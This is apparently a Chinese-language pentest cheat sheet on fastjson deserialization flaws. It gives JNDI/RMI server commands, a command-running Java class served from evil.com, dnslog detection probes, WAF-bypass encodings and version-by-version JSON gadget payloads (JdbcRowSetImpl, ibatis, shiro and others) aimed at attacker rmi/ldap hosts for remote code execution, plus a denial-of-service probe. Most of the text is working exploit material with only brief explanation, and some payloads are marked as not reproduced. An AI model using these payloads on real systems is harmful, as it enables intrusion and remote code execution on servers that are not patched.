# fastjson

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

> 项目地址 : https://github.com/alibaba/fastjson

**相关文章**
- [Fastjson反序列化进攻利用](https://mp.weixin.qq.com/s/i7-g89BJHIYTwaJbLuGZcQ)
- [fastjson反序列化历史与检测](https://mp.weixin.qq.com/s/cCUYMiPsJnqHHdKHUno6UA)
- [Fastjson探测简介](https://mp.weixin.qq.com/s/Js2FeYr9cWLtWXkgqd7HiQ)
- [fastjson漏洞时间线](https://mp.weixin.qq.com/s/f2scum8wWcCeOOOR7nKHaQ)
- [某json 绕墙的Tips](https://xz.aliyun.com/t/7568)
- [浅谈fastjson waf Bypass思路](https://sec-in.com/article/950)

**相关工具**
- [wyzxxz/fastjson_rce_tool](https://github.com/wyzxxz/fastjson_rce_tool) - fastjson rce 命令执行综合利用工具，一键操作,fastjson remote code execute poc
- [c0ny1/FastjsonExploit](https://github.com/c0ny1/FastjsonExploit) - fastjson漏洞快速利用框架
- [Lonely-night/fastjson_gadgets_scanner](https://github.com/Lonely-night/fastjson_gadgets_scanner) - scanner 扫描反编译生成的源文件
- [p1g3/Fastjson-Scanner](https://github.com/p1g3/Fastjson-Scanner) - a burp extension to find where use fastjson
- [Maskhe/FastjsonScan](https://github.com/Maskhe/FastjsonScan)
- [bigsizeme/fastjson-check](https://github.com/bigsizeme/fastjson-check)

---

## JNDI注入影响范围

1. 基于 rmi 的利用方式, 适用 jdk 版本：JDK 6u132、JDK 7u122、JDK 8u113 之前

2. 基于 ldap 的利用方式, 适用 jdk 版本：JDK 11.0.1、8u191、7u201、6u211 之前

---

## 运行 JNDI 服务器命令

**JNDI-Injection-Exploit**

```bash
java -jar /pentest/JNDI-Injection-Exploit/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps ip>
java -jar /pentest/JNDI-Injection-Exploit/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping xxxx.dnslog.cn" -A xx.xx.xx.xx
```

**marshalsec**

如果没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，我们可以简单利用 RMI 进行命令执行

首先编译并上传命令执行代码，如http://evil.com/runexec.class：
```java
// javac runexec.java
import java.lang.Runtime;
import java.lang.Process;

public class runexec {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```
```bsh
javac runexec.java
```

启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类 runexec.class

```bash
java -cp /pentest/marshalsec/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx/#runexec" 9999
```

发送 payload ,指定 rmi 服务器即可

---

## 探测

**如何区分 fastjson 与 jackson**

1. 不闭合花括号看报错信息
2. 减少参数
    ```
    {"name":"S", "age":21}              // Fastjson 是不会报错
    {"name":"S", "age":21,"xxx":123}    // Jackson 语法相对比较严格,会报错
    ```
3. 报错关键词
    ```
    com.alibaba.fastjson.JSONException
    ```

    触发方式如下
    ```
    {"x":"
    ["x":1]
    {"x":{"@type":"java.lang.AutoCloseable"
    ```

**java.net.Inet4Address**

```
Content-Type: application/json

{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
```

**java.net.Inet6Address**
```
Content-Type: application/json

{"@type":"java.net.Inet6Address","val":"xxx.dnslog.cn"}
```

**java.net.InetSocketAddress**
```
Content-Type: application/json

{"@type":"java.net.InetSocketAddress"{"address":,"val":"xxx.dnslog.cn"}}
```

**java.net.URL**
```
Content-Type: application/json

{{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}:"x"}
```

**一些畸形方式**
```
Content-Type: application/json

{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://xxx.dnslog.cn"}}""}
Set[{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}]
Set[{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}
{{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}:0
{{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}:"aaa"}
```

---

## WAF 绕过方法

- 加反斜杠特殊字符
- Unicode/Hex 多重编码绕过
    ```json
    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
    {"\u0040\u0074\u0079\u0070\u0065":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"rmi://localhost:1099/Exploit","\x61\x75\x74\x6f\x43\x6f\x6d\x6d\x69\x74":true}
    ```
- 对关键词 (例如: @type) 做处理
    ```json
    {"@\x74ype":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://xx.xx.xx.xx:3888"}
    ```
- type 的变形
- \b 绕过
    ```json
    {"@type":\b"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true}}
    ```
- 如果以上都不行, 就 fuzz 试试吧

### 结合Feature词法分析器进行混淆绕过

以下内容部分来自 <sup>[tkswifty [浅谈fastjson waf Bypass思路](https://sec-in.com/article/950) 文章]</sup>

**AllowSingleQuotes**

AllowSingleQuotes 特性决定 parser 是否允许单引号来包住属性名称和字符串值。

可以使用单引号替代双引号，配合编码或者其他方式进行混淆绕过 waf 语义分析：
```json
{'name':'test'}
```

**AllowArbitraryCommas**

AllowArbitraryCommas 特性允许多重逗号。那么可以在多个属性之间引入多个逗号,进行混淆：
```json
{,,,,,,,,,,"name":"test",,,,,,,,"age":20}
```

**AllowComment**

AllowComment 该特性决定 parser 将是否允许解析使用 Java/C++ 样式的注释（包括'/'+'*' 和'//' 变量）。

可以通过插入相关的注释进行混淆，也可以构造超长数据包的方式进行 Bypass：
```json
{"name":"test"/*hahahhah*/,"age":20}
```

### 利用 FastJson 智能匹配进行混淆绕过

FastJSON 存在智能匹配的特性，即使 JavaBean 中的字段和 JSON 中的 key 并不完全匹配，在一定程度上还是可以正常解析的。主要是在 JavaBeanDeserializer.smartMatch 方法进行实现。假设当前 UserBean 的属性如下，可以利用智能匹配的特性，可以尝试使用如下方法对 key 进行混淆：
```java
private String name;
private Integer age;
```

**使用-和_进行混淆**

FastJSON 会对 JSON 中没有成功映射 JavaBean 的 key 做智能匹配，在反序列的过程中会忽略大小写和下划线，自动会把下划线命名的 Json 字符串转化到驼峰式命名的 Java 对象字段中。

使用 `-` 混淆字段名
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","d-a-t-aSou-rc-eN-ame":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
```

使用 `_` 混淆字段名
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","d_a_t_aSou_rc_eN_ame":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
```

1.2.36 版本及后续版本还可以支持同时使用_和 - 进行组合混淆
```json
{"n-a_m-e":"test","age":20}
```

可以以此作为依据进行简单的 fastjson 版本判断

**使用 is 开头的 key 字段**

Fastjson 在做智能匹配时，如果 key 以 is 开头, 则忽略 is 开头, 相关代码如下:

在原始 JavaBean 属性 age 和 name 基础上，在 JSON key 加入 is 仍可正常解析：
```
{"isname":"test","isage":20}
```

### 修改 Content-Type

某些 Waf 考虑到解析效率的问题，会根据 Content-Type 的内容进行针对性的拦截分析，例如值为 appliction/xml 时会进行 XXE 的检查，那么可以尝试将 Content-Type 设置为通配符 `*/*` 来绕过相关的检查, 同理对 application/jsonContent-Type 的请求，也可以尝试将 Content-Type 设置为通配符 `*/*` 来绕过相关的检查：

---

## fastjson<=1.2.24 (CNVD-2017-02833)

**相关文章**
- [【超详细】Fastjson1.2.24反序列化漏洞复现](https://mp.weixin.qq.com/s/Pd_8wVHEyidlXbOuhp_gTQ)
- https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce

**描述**

该漏洞在默认配置下即存在, 所以在 fastjson<=1.2.24 版本时, 该 poc 通杀

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}

{"v24":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}}
```

官方于 2017/02/06 发布 1.2.25 版本修复该漏洞, 并增加了黑名单策略用来限制恶意类被反序列化.

此后, fastjson 的漏洞基本都是基于黑名单限制的绕过.

---

1.2.25 版本开始, 引入了 checkAutotype 安全机制 (白名单检测).

这也在极大程度上减小了之后几个版本基于黑名单绕过的 poc 的危害影响范围.

---

## fastjson<=1.2.25

```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties"："data_source":"rmi://localhost:1099/Exploit"}}

{"@type":"[com.sun.rowset.RowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

---

## fastjson<=1.2.41

**描述**

第一个 Fastjson 反序列化漏洞爆出后，fastjson在1.2.25版本设置了 autoTypeSupport 属性默认为 false，并且增加了`checkAutoType()` 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。 com.sun.rowset.JdbcRowSetImpl 在1.2.25版本被加入了黑名单，fastjson 有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。

autoTypeSupport 属性为 true 才能使用。（fastjson>=1.2.25 默认为 false）

fastjson<=1.2.41 版本, 且开启 autoType
```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

POC
```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}

{"v41":{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://0.0.0.0","autoCommit":true}}
```

它与 1.2.24 版本 poc 唯一的不同之处是类名前后分别加上了 "L" 与 ";"

此时 com.sun.rowset.JdbcRowSetImpl 已经进了黑名单, 通过加上特殊字符, 绕过黑名单, 后续代码中会将 "L" 与 ";" 字符自动去除, 导致该恶意类被还原并被反序列化.

官方于 2017/12/12 发布 1.2.42 版本修复该绕过方式. (与黑名单进行比较之前就去除类名中的 "L" 与 ";")

fastjson1.2.42 版本起, fastjson 黑名单做了加密处理

---

## fastjson<=1.2.42

**描述**

fastjson 在1.2.42版本新增了校验机制。

如果输入类名的开头和结尾是L和;就将头和尾去掉，再进行黑名单验证。 还把黑名单的内容进行了加密，防止安全人员进行研究，增加了研究的门槛。 但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist 绕过方法，在类名外部嵌套2层L;。 原类名：com.sun.rowset.JdbcRowSetImpl 绕过： LLcom.sun.rowset.JdbcRowSetImpl;;

多重套用, 因为后续代码中的 "L" 与 ";" 字符去除判断方法会不断递归, 直至检测不到.

利用条件: fastjson<=1.2.42 版本, 且开启 autoType

```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}

{"v42":{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://0.0.0.0","autoCommit":true}}

{"@type":"LLcom.sun.rowset.RowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

官方于 2017/12/16 发布 1.2.43 版本修复该绕过方式

---

## fastjson<=1.2.43

**描述**

fastjson 在 1.2.43 中 `checkAutoType()` 函数增加判断开头为 LL 直接报错。 绕过方法: 根据 fastjson 判断函数，`[` 开头则提取类名，且后面字符字符为 `[`、`{` 等，即可正常调用。

autoTypeSupport 属性为 true 才能使用。（fastjson>=1.2.25 默认为 false）

利用条件: 1.2.38<=fastjson<=1.2.43, 且开启 autoType

```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}

{"v43":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://0.0.0.0","autoCommit":true]}}}
```

官方于 2017/12/21 发布 1.2.44 版本修复该绕过方式

---

## fastjson<=1.2.45

**描述**

前提条件：需要目标服务端存在 mybatis 的 jar 包，且版本需为 3.x.x 系列 <3.5.0 的版本。 使用黑名单绕过，org.apache.ibatis.datasource 在1.2.46版本被加入了黑名单 由于在项目中使用的频率也较高，所以影响范围较大。

利用条件: fastjson<=1.2.45, 受限依赖于 ibatis, 但无需开启 autoType

```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}

{"v45":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"},"xxx":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://0.0.0.0"}}}
```

官方于 2018/02/05 发布 1.2.46 版本修复该绕过方式

---

## fastjson<=1.2.47 (CNVD-2019-22238)

**描述**

autoType 为关闭状态也可使用。 loadClass 中默认 cache 设置为 true，利用分为2步执行，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.JdbcRowSetImpl 这个类，绕过了黑名单机制。

无需开启 autoType, 在 fastjson<=1.2.47 版本时, 该 poc 通杀

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    }
}

{"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://0.0.0.0","autoCommit":true}}
```

官方于 2018/03/25 发布 1.2.48 版本修复该绕过方式

**相关文章**
- [Fastjson <=1.2.47 远程代码执行漏洞分析](https://www.anquanke.com/post/id/181874)
- [fastjson =< 1.2.47 反序列化漏洞复现](https://www.cnblogs.com/zhengjim/p/11433926.html)
- https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce

**相关工具**
- [CaijiOrz/fastjson-1.2.47-RCE](https://github.com/CaijiOrz/fastjson-1.2.47-RCE)

---

## fastjson<=1.2.59

利用条件: fastjson<=1.2.59, 且开启autoType

```json
# 以下poc未复现成功
{"v59_error":{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://127.0.0.1"}}

{"v59_error":{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://127.0.0.1"}}
```

官方于 2019/09/05 发布 1.2.60 版本修复该绕过方式

---

## fastjson<1.2.60 (Dos漏洞)

```
eyJhIjoiXHgaGiJ9

# base64解码后的数据发包,与正常请求相比,出现明显延迟即为存在漏洞
```

---

## fastjson<=1.2.61

利用条件: fastjson<=1.2.61, 且开启 autoType

```json
# 以下poc未复现成功

{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"rmi://127.0.0.1"}

{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://127.0.0.1","Object":"a"}

{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"}
```

官方于 2010/10/07 发布 1.2.62 版本修复该绕过方式

---

## fastjson<=1.2.62

利用条件: fastjson<=1.2.62, 且开启 autoType

该 poc 来自于 jackson, 对应漏洞编号 CVE-2020-8840
```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://0.0.0.0"}}

{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"rmi://localhost:1099/Exploit\"}
```

```json
# 以下poc未复现成功
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://0.0.0.0"}}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://0.0.0.0"}

{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor","parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://0.0.0.0"},"namespace":""}
```

官方于2019/10/07发布1.2.63版本修复该绕过方式

---

## fastjson < 1.2.66

利用条件: fastjson<=1.2.66, 且开启 autoType

```json
{"v66":{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory","jndiNames":["ldap://0.0.0.0"],"Realms":[""]}}

{"v66":{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://0.0.0.0"}}
```

```json
# 以下poc未复现成功

{"v66_error":{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://0.0.0.0"}}

{"v66_error":{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://0.0.0.0"}}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://xx.xx.xx.xx:1389/Calc"}}
```

官方于2020/03/19发布1.2.67版本修复该绕过方式

---

1.2.67 版本及其之后的版本传递 JSON 格式 poc 不在需要参数名, poc 格式发生变化

---

## fastjson < 1.2.66 版本拒绝服务漏洞

**影响范围**
- 1.2.36 - 1.2.62

**相关文章**
- [fastjson < 1.2.66 版本最新漏洞分析](https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q)

---

## fastjson<=1.2.68

**描述**

利用条件: fastjson<=1.2.68, 且开启 autoType

```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://0.0.0.0"}

{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://0.0.0.0"}
```

官方于 2020/06/01 发布 1.2.69 版本修复该绕过方式

---

## AnterosDBCPConfig

```json
{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"rmi://localhost:1099/Exploit\"}
{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"}
```

---

## JtaTransactionConfig

```json
{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}}
```

---

## fastjson <= 1.2.80

**相关文章**
- [Fastjson1.2.80漏洞复现](https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

**POC | Payload | exp**
- [Lonely-night/fastjsonVul](https://github.com/Lonely-night/fastjsonVul) - fastjson 80 远程代码执行漏洞复现
